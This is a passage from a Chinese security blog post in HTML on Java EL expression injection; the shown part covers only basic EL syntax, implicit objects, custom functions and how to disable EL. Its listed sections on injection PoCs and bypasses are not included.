@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html>
+    <!-- Head -->
+    <head><meta name="generator" content="Hexo 3.9.0">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="author" content="Mi1k7ea">
+    <meta name="description" itemprop="description" content="已完结.">
+    <meta name="keywords" content=",Web安全,Java,EL注入">
+    <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+    <!-- Page Title -->
+    
+        <title>（先知首发）浅析EL表达式注入漏洞 | Mi1k7ea</title>
+    
+    <link rel="icon" href="/img/kanxi.jpg">
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <link href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
+    
+    <script src="/js/script.js"></script>
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <style>
+        .deactiveColor{
+            color: #37474f;
+        }
+        .activeColor{
+            color: #006064;
+        }
+        a:hover{
+            color: #006064;
+        }
+        .header-btn{
+            color: #37474f;
+        }
+        
+    </style>
+</head>
+    <body>
+        <div class="container">
+
+            <!-- Top Anchor -->
+            <div id="top"></div>
+
+            <!-- Header -->
+            <header class="header-wrapper">
+    <div class="header-title-wrapper">
+        <!-- Page Title -->
+        <p class="header-title">
+             
+                
+                    （先知首发）浅析EL表达式注入漏洞
+                
+            
+        </p>  
+    </div>    
+
+    
+    
+    <div class="header-detail">
+        <!-- Header Button -->
+        <div class="header-btn-wrapper">
+            
+                <span>
+                    <a class="home-btn header-btn" href="/" title="homepage"><i class="fa fa-home"></i></a>
+                </span>
+
+                
+            
+        </div>
+    </div>
+</header>
+
+            <!-- Main -->
+            <main>
+                <article class="post-wrapper">
+    
+
+    
+        <!-- Article Catalog -->
+        <div class="catalog-dropdown col-xs-12 col-sm-12">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-EL简介"><span class="toc-number">1.</span> <span class="toc-text">0x01 EL简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-基本语法"><span class="toc-number">2.</span> <span class="toc-text">0x02 基本语法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EL语法"><span class="toc-number">2.1.</span> <span class="toc-text">EL语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#与-运算符"><span class="toc-number">2.2.</span> <span class="toc-text">[ ]与.运算符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#变量"><span class="toc-number">2.3.</span> <span class="toc-text">变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#操作符"><span class="toc-number">2.4.</span> <span class="toc-text">操作符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#隐式对象"><span class="toc-number">2.5.</span> <span class="toc-text">隐式对象</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pageContext对象"><span class="toc-number">2.5.1.</span> <span class="toc-text">pageContext对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Scope对象"><span class="toc-number">2.5.2.</span> <span class="toc-text">Scope对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#param和paramValues对象"><span class="toc-number">2.5.3.</span> <span class="toc-text">param和paramValues对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#header和headerValues对象"><span class="toc-number">2.5.4.</span> <span class="toc-text">header和headerValues对象</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EL中的函数"><span class="toc-number">2.6.</span> <span class="toc-text">EL中的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EL表达式调用Java方法"><span class="toc-number">2.7.</span> <span class="toc-text">EL表达式调用Java方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-JSP中启动-禁用EL表达式"><span class="toc-number">3.</span> <span class="toc-text">0x03 JSP中启动/禁用EL表达式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#全局禁用EL表达式"><span class="toc-number">3.1.</span> <span class="toc-text">全局禁用EL表达式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#单个文件禁用EL表达式"><span class="toc-number">3.2.</span> <span class="toc-text">单个文件禁用EL表达式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-EL表达式注入漏洞"><span class="toc-number">4.</span> <span class="toc-text">0x04 EL表达式注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#通用PoC"><span class="toc-number">4.1.</span> <span class="toc-text">通用PoC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2011-2730"><span class="toc-number">4.2.</span> <span class="toc-text">CVE-2011-2730</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Wooyun案例"><span class="toc-number">4.3.</span> <span class="toc-text">Wooyun案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JUEL示例"><span class="toc-number">4.4.</span> <span class="toc-text">JUEL示例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-绕过方法"><span class="toc-number">5.</span> <span class="toc-text">0x05 绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用反射机制绕过"><span class="toc-number">5.1.</span> <span class="toc-text">利用反射机制绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用ScriptEngine调用JS引擎绕过"><span class="toc-number">5.2.</span> <span class="toc-text">利用ScriptEngine调用JS引擎绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-防御方法"><span class="toc-number">6.</span> <span class="toc-text">0x06 防御方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-参考"><span class="toc-number">7.</span> <span class="toc-text">0x07 参考</span></a></li></ol>
+        </div>
+    
+
+    
+        <!--For now, Lightbox Only Show in Post Layout -->
+        
+
+        
+        
+            <!-- Article Img Lightbox -->
+            <div class="gallery">
+    
+    
+    <div class="lightbox">
+        <!-- Close Button -->
+        <span class="close-gallery">&times;</span>
+        
+        <!-- Photo -->
+        <img class="gallery-photo">
+    </div>
+</div>
+        
+    
+
+    
+
+    <!-- Article Content -->
+    <div class="post-content">
+        <p>先知：<a href="https://xz.aliyun.com/t/7692" target="_blank" rel="noopener">https://xz.aliyun.com/t/7692</a></p>
+<h2 id="0x01-EL简介"><a href="#0x01-EL简介" class="headerlink" title="0x01 EL简介"></a>0x01 EL简介</h2><p>EL（Expression Language） 是为了使JSP写起来更加简单。表达式语言的灵感来自于 ECMAScript 和 XPath 表达式语言，它提供了在 JSP 中简化表达式的方法，让Jsp的代码更加简化。</p>
+<p>EL表达式主要功能如下：</p>
+<ul>
+<li>获取数据：EL表达式主要用于替换JSP页面中的脚本表达式，以从各种类型的Web域中检索Java对象、获取数据（某个Web域中的对象，访问JavaBean的属性、访问List集合、访问Map集合、访问数组）；</li>
+<li>执行运算：利用EL表达式可以在JSP页面中执行一些基本的关系运算、逻辑运算和算术运算，以在JSP页面中完成一些简单的逻辑运算，例如<code>${user==null}</code>；</li>
+<li>获取Web开发常用对象：EL表达式定义了一些隐式对象，利用这些隐式对象，Web开发人员可以很轻松获得对Web常用对象的引用，从而获得这些对象中的数据；</li>
+<li>调用Java方法：EL表达式允许用户开发自定义EL函数，以在JSP页面中通过EL表达式调用Java类的方法；</li>
+</ul>
+<h2 id="0x02-基本语法"><a href="#0x02-基本语法" class="headerlink" title="0x02 基本语法"></a>0x02 基本语法</h2><h3 id="EL语法"><a href="#EL语法" class="headerlink" title="EL语法"></a>EL语法</h3><p>在JSP中访问模型对象是通过EL表达式的语法来表达。所有EL表达式的格式都是以<code>${}</code>表示。例如，<code>${ userinfo}</code>代表获取变量userinfo的值。当EL表达式中的变量不给定范围时，则默认在page范围查找，然后依次在request、session、application范围查找。也可以用范围作为前缀表示属于哪个范围的变量，例如：<code>${ pageScope. userinfo}</code>表示访问page范围中的userinfo变量。</p>
+<p>简单地说，使用EL表达式语法：<code>${EL表达式}</code></p>
+<p>其中，<strong>EL表达式和JSP代码等价转换</strong>。事实上，可以将EL表达式理解为一种简化的JSP代码。</p>
+<p>扩展JSP代码的写法总结：</p>
+<ul>
+<li><p>JSP表达式：<code>&lt;%=变量或表达式&gt;</code></p>
+<p>向浏览器输出变量或表达式的计算结果。</p>
+</li>
+<li><p>JSP脚本：<code>&lt;%Java代码%&gt;</code></p>
+<p>执行java代码的原理：翻译到_jspService()方法中。</p>
+</li>
+<li><p>JSP声明：<code>&lt;%!变量或方法%&gt;</code></p>
+<p>声明jsp的成员变量或成员方法。</p>
+</li>
+<li><p>JSP注释：<code>&lt;%!--JSP注释--%&gt;</code></p>
+<p>用于注释JSP代码，不会翻译到Java文件中，也不会执行。</p>
+</li>
+</ul>
+<h3 id="与-运算符"><a href="#与-运算符" class="headerlink" title="[ ]与.运算符"></a>[ ]与.运算符</h3><p>EL表达式提供<code>.</code>和<code>[]</code>两种运算符来存取数据。</p>
+<p>当要存取的属性名称中包含一些特殊字符，如<code>.</code>或<code>-</code>等并非字母或数字的符号，就一定要使用<code>[]</code>。例如：<code>${user.My-Name}</code>应当改为<code>${user[&quot;My-Name&quot;]}</code>。</p>
+<p>如果要动态取值时，就可以用<code>[]</code>来做，而<code>.</code>无法做到动态取值。例如：<code>${sessionScope.user[data]}</code>中data 是一个变量。</p>
+<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>EL表达式存取变量数据的方法很简单，例如：<code>${username}</code>。它的意思是取出某一范围中名称为username的变量。因为我们并没有指定哪一个范围的username，所以它会依序从Page、Request、Session、Application范围查找。假如途中找到username，就直接回传，不再继续找下去，但是假如全部的范围都没有找到时，就回传””。EL表达式的属性如下：</p>
+<table>
+<thead>
+<tr>
+<th>属性范围在EL中的名称</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Page</td>
+<td>PageScope</td>
+</tr>
+<tr>
+<td>Request</td>
+<td>RequestScope</td>
+</tr>
+<tr>
+<td>Session</td>
+<td>SessionScope</td>
+</tr>
+<tr>
+<td>Application</td>
+<td>ApplicationScope</td>
+</tr>
+</tbody>
+</table>
+<p>JSP表达式语言定义可在表达式中使用的以下文字：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">文字</th>
+<th style="text-align:left">文字的值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">Boolean</td>
+<td style="text-align:left">true 和 false</td>
+</tr>
+<tr>
+<td style="text-align:left">Integer</td>
+<td style="text-align:left">与 Java 类似。可以包含任何整数，例如 24、-45、567</td>
+</tr>
+<tr>
+<td style="text-align:left">Floating Point</td>
+<td style="text-align:left">与 Java 类似。可以包含任何正的或负的浮点数，例如 -1.8E-45、4.567</td>
+</tr>
+<tr>
+<td style="text-align:left">String</td>
+<td style="text-align:left">任何由单引号或双引号限定的字符串。对于单引号、双引号和反斜杠，使用反斜杠字符作为转义序列。必须注意，如果在字符串两端使用双引号，则单引号不需要转义。</td>
+</tr>
+<tr>
+<td style="text-align:left">Null</td>
+<td style="text-align:left">null</td>
+</tr>
+</tbody>
+</table>
+<h3 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h3><p>JSP表达式语言提供以下操作符，其中大部分是Java中常用的操作符：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">术语</th>
+<th style="text-align:left">定义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">算术型</td>
+<td style="text-align:left">+、-（二元）、*、/、div、%、mod、-（一元）</td>
+</tr>
+<tr>
+<td style="text-align:left">逻辑型</td>
+<td style="text-align:left">and、&amp;&amp;、or、双管道符、!、not</td>
+</tr>
+<tr>
+<td style="text-align:left">关系型</td>
+<td style="text-align:left">==、eq、!=、ne、&lt;、lt、&gt;、gt、&lt;=、le、&gt;=、ge。可以与其他值进行比较，或与布尔型、字符串型、整型或浮点型文字进行比较。</td>
+</tr>
+<tr>
+<td style="text-align:left">空</td>
+<td style="text-align:left">empty 空操作符是前缀操作，可用于确定值是否为空。</td>
+</tr>
+<tr>
+<td style="text-align:left">条件型</td>
+<td style="text-align:left">A ?B :C。根据 A 赋值的结果来赋值 B 或 C。</td>
+</tr>
+</tbody>
+</table>
+<h3 id="隐式对象"><a href="#隐式对象" class="headerlink" title="隐式对象"></a>隐式对象</h3><p>JSP表达式语言定义了一组隐式对象，其中许多对象在 JSP scriplet 和表达式中可用：</p>
+<table>
+<thead>
+<tr>
+<th>术语</th>
+<th>定义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>pageContext</td>
+<td>JSP页的上下文，可以用于访问 JSP 隐式对象，如请求、响应、会话、输出、servletContext 等。例如，<code>${pageContext.response}</code>为页面的响应对象赋值。</td>
+</tr>
+</tbody>
+</table>
+<p>此外，还提供几个隐式对象，允许对以下对象进行简易访问：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">术语</th>
+<th style="text-align:left">定义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">param</td>
+<td style="text-align:left">将请求参数名称映射到单个字符串参数值（通过调用 ServletRequest.getParameter (String name) 获得）。getParameter (String) 方法返回带有特定名称的参数。表达式<code>${param . name}</code>相当于 request.getParameter (name)。</td>
+</tr>
+<tr>
+<td style="text-align:left">paramValues</td>
+<td style="text-align:left">将请求参数名称映射到一个数值数组（通过调用 ServletRequest.getParameter (String name) 获得）。它与 param 隐式对象非常类似，但它检索一个字符串数组而不是单个值。表达式 <code>${paramvalues. name}</code> 相当于 request.getParamterValues(name)。</td>
+</tr>
+<tr>
+<td style="text-align:left">header</td>
+<td style="text-align:left">将请求头名称映射到单个字符串头值（通过调用 ServletRequest.getHeader(String name) 获得）。表达式 <code>${header. name}</code> 相当于 request.getHeader(name)。</td>
+</tr>
+<tr>
+<td style="text-align:left">headerValues</td>
+<td style="text-align:left">将请求头名称映射到一个数值数组（通过调用 ServletRequest.getHeaders(String) 获得）。它与头隐式对象非常类似。表达式<code>${headerValues. name}</code>相当于 request.getHeaderValues(name)。</td>
+</tr>
+<tr>
+<td style="text-align:left">cookie</td>
+<td style="text-align:left">将 cookie 名称映射到单个 cookie 对象。向服务器发出的客户端请求可以获得一个或多个 cookie。表达式<code>${cookie. name .value}</code>返回带有特定名称的第一个 cookie 值。如果请求包含多个同名的 cookie，则应该使用<code>${headerValues. name}</code>表达式。</td>
+</tr>
+<tr>
+<td style="text-align:left">initParam</td>
+<td style="text-align:left">将上下文初始化参数名称映射到单个值（通过调用 ServletContext.getInitparameter(String name) 获得）。</td>
+</tr>
+</tbody>
+</table>
+<p>除了上述两种类型的隐式对象之外，还有些对象允许访问多种范围的变量，如 Web 上下文、会话、请求、页面：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">术语</th>
+<th style="text-align:left">定义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">pageScope</td>
+<td style="text-align:left">将页面范围的变量名称映射到其值。例如，EL 表达式可以使用<code>${pageScope.objectName}</code>访问一个 JSP 中页面范围的对象，还可以使用<code>${pageScope .objectName. attributeName}</code>访问对象的属性。</td>
+</tr>
+<tr>
+<td style="text-align:left">requestScope</td>
+<td style="text-align:left">将请求范围的变量名称映射到其值。该对象允许访问请求对象的属性。例如，EL 表达式可以使用<code>${requestScope. objectName}</code>访问一个 JSP 请求范围的对象，还可以使用<code>${requestScope. objectName. attributeName}</code>访问对象的属性。</td>
+</tr>
+<tr>
+<td style="text-align:left">sessionScope</td>
+<td style="text-align:left">将会话范围的变量名称映射到其值。该对象允许访问会话对象的属性。例如：<code>${sessionScope. name}</code></td>
+</tr>
+<tr>
+<td style="text-align:left">applicationScope</td>
+<td style="text-align:left">将应用程序范围的变量名称映射到其值。该隐式对象允许访问应用程序范围的对象。</td>
+</tr>
+</tbody>
+</table>
+<h4 id="pageContext对象"><a href="#pageContext对象" class="headerlink" title="pageContext对象"></a>pageContext对象</h4><p>pageContext对象是JSP中pageContext对象的引用。通过pageContext对象，您可以访问request对象。比如，访问request对象传入的查询字符串，就像这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.request.queryString&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/04/26/浅析EL表达式注入漏洞/1.png" alt=""></p>
+<h4 id="Scope对象"><a href="#Scope对象" class="headerlink" title="Scope对象"></a>Scope对象</h4><p>pageScope，requestScope，sessionScope，applicationScope变量用来访问存储在各个作用域层次的变量。</p>
+<p>举例来说，如果您需要显式访问在applicationScope层的box变量，可以这样来访问：applicationScope.box。</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;% </span><br><span class="line">    pageContext.setAttribute(<span class="string">"name"</span>,<span class="string">"mi1k7ea_page"</span>);  </span><br><span class="line">    request.setAttribute(<span class="string">"name"</span>,<span class="string">"mi1k7ea_request"</span>);</span><br><span class="line">    session.setAttribute(<span class="string">"user"</span>,<span class="string">"mi1k7ea_session"</span>);</span><br><span class="line">    application.setAttribute(<span class="string">"user"</span>,<span class="string">"mi1k7ea_application"</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">pageScope.name:$&#123;pageScope.name&#125;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">requestScope.name : $&#123;requestScope.name&#125;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">sessionScope.user : $&#123;sessionScope.user&#125;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">applicationScope.user : $&#123;applicationScope.user&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/04/26/浅析EL表达式注入漏洞/5.png" alt=""></p>
+<h4 id="param和paramValues对象"><a href="#param和paramValues对象" class="headerlink" title="param和paramValues对象"></a>param和paramValues对象</h4><p>param和paramValues对象用来访问参数值，通过使用request.getParameter方法和request.getParameterValues方法。</p>
+<p>举例来说，访问一个名为order的参数，可以这样使用表达式：${param.order}，或者${param[“order”]}。</p>
+<p>接下来的例子表明了如何访问request中的username参数：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.*,java.util.*"</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String title = <span class="string">"Accessing Request Param"</span>;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&lt;% out.print(title); %&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;h1&gt;&lt;% out.print(title); %&gt;&lt;/h1&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;div align=<span class="string">"center"</span>&gt;</span><br><span class="line">&lt;p&gt;$&#123;param["username"]&#125;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>param对象返回单一的字符串，而paramValues对象则返回一个字符串数组。</p>
+<p><img src="/2020/04/26/浅析EL表达式注入漏洞/2.png" alt=""></p>
+<h4 id="header和headerValues对象"><a href="#header和headerValues对象" class="headerlink" title="header和headerValues对象"></a>header和headerValues对象</h4><p>header和headerValues对象用来访问信息头，通过使用request.getHeader()方法和request.getHeaders()方法。</p>
+<p>举例来说，要访问一个名为user-agent的信息头，可以这样使用表达式：<code>${header.user-agent}</code>，或者<code>${header[&quot;user-agent&quot;]}</code>。</p>
+<p>接下来的例子表明了如何访问user-agent信息头：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.*,java.util.*"</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String title = <span class="string">"User Agent Example"</span>;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&lt;% out.print(title); %&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;h1&gt;&lt;% out.print(title); %&gt;&lt;/h1&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;div align=<span class="string">"center"</span>&gt;</span><br><span class="line">&lt;p&gt;$&#123;header["user-agent"]&#125;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>运行结果如下：</p>
+<p><img src="/2020/04/26/浅析EL表达式注入漏洞/3.png" alt=""></p>
+<p>header对象返回单一值，而headerValues则返回一个字符串数组。</p>
+<h3 id="EL中的函数"><a href="#EL中的函数" class="headerlink" title="EL中的函数"></a>EL中的函数</h3><p>EL允许您在表达式中使用函数。这些函数必须被定义在自定义标签库中。函数的使用语法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;ns:func(param1, param2, ...)&#125;</span><br></pre></td></tr></table></figure>
+<p>ns指的是命名空间（namespace），func指的是函数的名称，param1指的是第一个参数，param2指的是第二个参数，以此类推。比如，有函数fn:length，在JSTL库中定义，可以像下面这样来获取一个字符串的长度：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;fn:length(&quot;Get my length&quot;)&#125;</span><br></pre></td></tr></table></figure>
+<p>要使用任何标签库中的函数，您需要将这些库安装在服务器中，然后使用<code>&lt;taglib&gt;</code>标签在JSP文件中包含这些库。</p>
+<h3 id="EL表达式调用Java方法"><a href="#EL表达式调用Java方法" class="headerlink" title="EL表达式调用Java方法"></a>EL表达式调用Java方法</h3><p>看个例子即可。</p>
+<p>先新建一个ELFunc类，其中定义的doSomething()函数用于给输入的参数字符拼接”.com”形成域名返回：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> eltest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ELFunc</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">doSomething</span><span class="params">(String str)</span></span>&#123;</span><br><span class="line">		<span class="keyword">return</span> str + <span class="string">".com"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>接着在WEB-INF文件夹下（除lib和classess目录外）新建test.tld文件，其中指定执行的Java方法及其URI地址：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">taglib</span> <span class="attr">version</span>=<span class="string">"2.0"</span> <span class="attr">xmlns</span>=<span class="string">"http://java.sun.com/xml/ns/j2ee"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-jsptaglibrary_2_0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tlib-version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">tlib-version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">short-name</span>&gt;</span>ELFunc<span class="tag">&lt;/<span class="name">short-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uri</span>&gt;</span>http://www.mi1k7ea.com/ELFunc<span class="tag">&lt;/<span class="name">uri</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>doSomething<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function-class</span>&gt;</span>eltest.ELFunc<span class="tag">&lt;/<span class="name">function-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function-signature</span>&gt;</span> java.lang.String doSomething(java.lang.String)<span class="tag">&lt;/<span class="name">function-signature</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">taglib</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>JSP文件中，先头部导入taglib标签库，URI为test.tld中设置的URI地址，prefix为test.tld中设置的short-name，然后直接在EL表达式中使用<code>类名:方法名()</code>的形式来调用该类方法即可：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@taglib</span> uri=<span class="string">"http://www.mi1k7ea.com/ELFunc"</span> prefix=<span class="string">"ELFunc"</span>%&gt;</span><br><span class="line">$&#123;ELFunc:doSomething(<span class="string">"mi1k7ea"</span>)&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/04/26/浅析EL表达式注入漏洞/6.png" alt=""></p>
+<h2 id="0x03-JSP中启动-禁用EL表达式"><a href="#0x03-JSP中启动-禁用EL表达式" class="headerlink" title="0x03 JSP中启动/禁用EL表达式"></a>0x03 JSP中启动/禁用EL表达式</h2><h3 id="全局禁用EL表达式"><a href="#全局禁用EL表达式" class="headerlink" title="全局禁用EL表达式"></a>全局禁用EL表达式</h3><p>web.xml中进入如下配置：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">jsp-config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jsp-property-group</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jsp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-ignored</span>&gt;</span>true<span class="tag">&lt;/<span class="name">el-ignored</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jsp-property-group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jsp-config</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="单个文件禁用EL表达式"><a href="#单个文件禁用EL表达式" class="headerlink" title="单个文件禁用EL表达式"></a>单个文件禁用EL表达式</h3><p>在JSP文件中可以有如下定义：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page isELIgnored=<span class="string">"true"</span> %&gt;</span><br></pre></td></tr></table></figure>
+<p>该语句表示是否禁用EL表达式，TRUE表示禁止，FALSE表示不禁止。</p>
+<p>JSP2.0中默认的启用EL表达式。</p>
+<p>例如如下的JSP代码禁用EL表达式：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page isELIgnored=<span class="string">"true"</span> %&gt;</span><br><span class="line">$&#123;pageContext.request.queryString&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/04/26/浅析EL表达式注入漏洞/4.png" alt=""></p>
